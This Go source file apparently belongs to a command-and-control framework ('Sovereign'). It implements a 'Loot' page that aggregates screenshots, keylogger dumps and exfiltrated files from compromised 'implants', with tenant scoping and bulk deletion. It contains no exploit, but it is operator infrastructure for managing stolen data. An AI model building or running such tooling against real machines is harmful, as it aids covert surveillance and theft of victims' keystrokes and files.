package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/r0si/sovereign/internal/db"
	"gorm.io/gorm"
)

type lootScreenshotDTO struct {
	ID        string `json:"id"`
	AgentID   string `json:"agent_id"`
	Filename  string `json:"filename"`
	Path      string `json:"path"`
	CreatedAt string `json:"created_at,omitempty"`
}

type lootTaskDTO struct {
	ID         uint      `json:"id"`
	AgentID    string    `json:"agent_id"`
	Hostname   string    `json:"hostname"`
	Type       string    `json:"type"`
	Command    string    `json:"command"`
	Result     string    `json:"result"`
	Error      string    `json:"error"`
	Status     string    `json:"status"`
	CreatedAt  time.Time `json:"created_at"`
	TransferID *uint     `json:"transfer_id,omitempty"`
	Filename   string    `json:"filename,omitempty"`
	SHA256     string    `json:"sha256,omitempty"`
	Size       int64     `json:"size,omitempty"`
}

func newLootScreenshot(agentID, filename string, mod time.Time) lootScreenshotDTO {
	dto := lootScreenshotDTO{
		ID:       "screenshot:" + agentID + ":" + filename,
		AgentID:  agentID,
		Filename: filename,
		Path:     agentID + "/" + filename,
	}
	if !mod.IsZero() {
		dto.CreatedAt = mod.UTC().Format(time.RFC3339)
	}
	return dto
}

func newLootTask(t db.Task) lootTaskDTO {
	return lootTaskDTO{
		ID:         t.ID,
		AgentID:    t.AgentID,
		Hostname:   t.Agent.Hostname,
		Type:       t.Type,
		Command:    t.Command,
		Result:     t.Result,
		Error:      t.Error,
		Status:     t.Status,
		CreatedAt:  t.CreatedAt,
		TransferID: t.TransferID,
	}
}

func lootDataDir(s *Server) string {
	s.configMu.RLock()
	defer s.configMu.RUnlock()
	if s.cfg != nil && s.cfg.Server.DataDir != "" {
		return s.cfg.Server.DataDir
	}
	return "data"
}

func mapLootTasks(tasks []db.Task) []lootTaskDTO {
	out := make([]lootTaskDTO, 0, len(tasks))
	for _, t := range tasks {
		out = append(out, newLootTask(t))
	}
	return out
}

// handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
func (s *Server) handleLootPage(c *gin.Context) {
	// Get the visible agent ids. The page derives its agent filter from the
	// loot rows themselves, so nothing consumes a full agent list: only the
	// tenant gate needs the ids, and shipping them as rows cost up to
	// LootAgentLimit (5 000) full implant models per page load.
	var agentIDs []string
	q := s.db.Model(&db.Implant{}).Order("last_seen desc")
	q = s.tenantScope(q, c)
	if err := q.Limit(LootAgentLimit).Pluck("id", &agentIDs).Error; err != nil {
		handleQueryError(c, err, "Failed to query loot agents")
		return
	}

	dataDir := lootDataDir(s)

	// Tenant gate: the screenshot store is keyed by agent dir on disk, so
	// restrict enumeration to agents visible to the caller — otherwise any
	// tenant sees every tenant's captures (filenames + timestamps).
	visibleAgents := make(map[string]bool, len(agentIDs))
	for _, id := range agentIDs {
		visibleAgents[id] = true
	}

	var allScreenshots []lootScreenshotDTO
	lootLimit := 500
	screenshotRoot := filepath.Join(dataDir, "screenshots")
	if entries, err := os.ReadDir(screenshotRoot); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			if !visibleAgents[e.Name()] {
				continue
			}
			agentDir := filepath.Join(screenshotRoot, e.Name())
			if files, err := os.ReadDir(agentDir); err == nil {
				for _, f := range files {
					if f.IsDir() || !(strings.HasSuffix(f.Name(), ".png") || strings.HasSuffix(f.Name(), ".jpg") || strings.HasSuffix(f.Name(), ".jpeg")) {
						continue
					}
					mod := time.Time{}
					if info, err := f.Info(); err == nil {
						mod = info.ModTime()
					}
					allScreenshots = append(allScreenshots, newLootScreenshot(e.Name(), f.Name(), mod))
					if len(allScreenshots) >= lootLimit {
						break
					}
				}
			}
			if len(allScreenshots) >= lootLimit {
				break
			}
		}
	}

	// Keylogger dumps
	var keylogTasks []db.Task
	keylogQ := s.db.Preload("Agent", func(db *gorm.DB) *gorm.DB { return db.Select("id", "hostname") }).
		Where("type = ?", "keylogger_dump")
	keylogQ = s.tenantScope(keylogQ, c)
	if err := keylogQ.
		Order("created_at desc").Limit(50).Find(&keylogTasks).Error; err != nil {
		handleQueryError(c, err, "Failed to query keylog tasks")
		return
	}

	// Historical URL-fetch/metadata rows stay visible, but durable transfer
	// chunk tasks are represented only by their completed session below.
	var downloadTasks []db.Task
	downloadQ := s.db.Preload("Agent", func(db *gorm.DB) *gorm.DB { return db.Select("id, hostname") }).
		Where("transfer_id IS NULL AND ((type = ? AND (data = '' OR data IS NULL)) OR type = ?)", "upload", "download")
	downloadQ = s.tenantScope(downloadQ, c)
	if err := downloadQ.
		Order("created_at desc").Limit(50).Find(&downloadTasks).Error; err != nil {
		handleQueryError(c, err, "Failed to query download tasks")
		return
	}
	// Durable pull sessions are the authoritative exfil record. Include
	// completed ones so a file that a transfer task fetched does not vanish
	// from Loot once the legacy task row stops carrying the blob.
	var completedPulls []db.FileTransfer
	pullQ := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
		Where("direction = ? AND status = ?", "pull", "completed")
	if err := pullQ.Order("completed_at DESC").Limit(50).Find(&completedPulls).Error; err != nil {
		slog.Warn("Failed to list completed file transfers", "err", err)
	}
	transferRows := make([]lootTaskDTO, 0, len(completedPulls))
	for _, ft := range completedPulls {
		transferID := ft.ID
		transferRows = append(transferRows, lootTaskDTO{
			ID: ft.ID, AgentID: ft.AgentID, Type: "pull", Command: ft.RemotePath,
			Result: fmt.Sprintf("(%d bytes)", ft.CommittedOffset), Status: "completed",
			CreatedAt: ft.CreatedAt, TransferID: &transferID,
			Filename: ft.Filename, SHA256: ft.SHA256, Size: ft.CommittedOffset,
		})
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":              "Sovereign - Loot",
		"ActiveNav":          "loot",
		"Screenshots":        allScreenshots,
		"KeylogTasks":        mapLootTasks(keylogTasks),
		"DownloadTasks":      mapLootTasks(downloadTasks),
		"CompletedTransfers": transferRows,
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

// deleteVisibleLootTask deletes one loot task row only when its owning agent
// is visible to the caller. Single statement: the old check-then-delete
// could delete after a concurrent tenant reassignment. Returns true when a
// row was actually deleted.
func (s *Server) deleteVisibleLootTask(c *gin.Context, id string, types []string) bool {
	res := s.db.Where("id = ? AND type IN ? AND agent_id IN (?)", id, types,
		s.tenantScope(s.db.Model(&db.Implant{}).Select("id"), c)).Delete(&db.Task{})
	return res.Error == nil && res.RowsAffected > 0
}

// handleLootBulkDelete deletes multiple loot items by composite IDs.
// IDs are "screenshot:AGENT:FILE", "keylog:TASK_ID", or "download:TASK_ID".
func (s *Server) handleLootBulkDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req struct {
		IDs []string `json:"ids"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || len(req.IDs) == 0 {
		respondError(c, http.StatusBadRequest, "ids array required")
		return
	}

	dataDir := lootDataDir(s)
	screenshotRoot := filepath.Join(dataDir, "screenshots")

	var deleted int
	for _, raw := range req.IDs {
		parts := strings.SplitN(raw, ":", 3)
		if len(parts) < 2 {
			continue
		}
		kind, id := parts[0], parts[1]
		switch kind {
		case "screenshot":
			if len(parts) != 3 {
				continue
			}
			agentDir := parts[1]
			filename := parts[2]
			// Tenant gate (silent skip, not 404: one response per batch).
			if !s.agentVisible(c, agentDir) {
				continue
			}
			fp := filepath.Join(screenshotRoot, agentDir, filename)
			if err := validateFilePath(fp, screenshotRoot); err == nil {
				if err := os.Remove(fp); err == nil {
					deleted++
				}
			}
		case "keylog":
			// Tenant gate via the owning agent: tasks carry no reliable
			// TenantID (createTask leaves it 0), so tenantScope on the task
			// row itself would hide even the operator's own rows. Chaining
			// tenantScope onto Delete's result was a no-op anyway.
			if s.deleteVisibleLootTask(c, id, []string{"keylogger_dump", "keylogger_start"}) {
				deleted++
			}
		case "download":
			if strings.HasPrefix(raw, "download:transfer:") {
				transferID, err := strconv.ParseUint(strings.TrimPrefix(raw, "download:transfer:"), 10, 64)
				if err != nil || transferID == 0 {
					continue
				}
				var ft db.FileTransfer
				if err := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
					Where("id = ? AND direction = ? AND status = ?", transferID, "pull", "completed").
					First(&ft).Error; err != nil {
					continue
				}
				if dir := s.rawDataDir(); dir != "" {
					dir = filepath.Join(dir, "transfers")
					if name, err := validateTransferFilename(ft.Filename, ft.RemotePath); err == nil {
						_ = os.Remove(transferFinalPath(dir, name, ft.ID))
					}
					_ = os.Remove(transferPartPath(dir, ft.ID))
				}
				if res := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
					Where("id = ? AND direction = ? AND status = ?", ft.ID, "pull", "completed").
					Delete(&db.FileTransfer{}); res.Error == nil && res.RowsAffected > 0 {
					deleted++
				}
				continue
			}
			if s.deleteVisibleLootTask(c, id, []string{"download", "upload"}) {
				deleted++
			}
		}
	}
	respond(c, gin.H{"deleted": deleted})
}
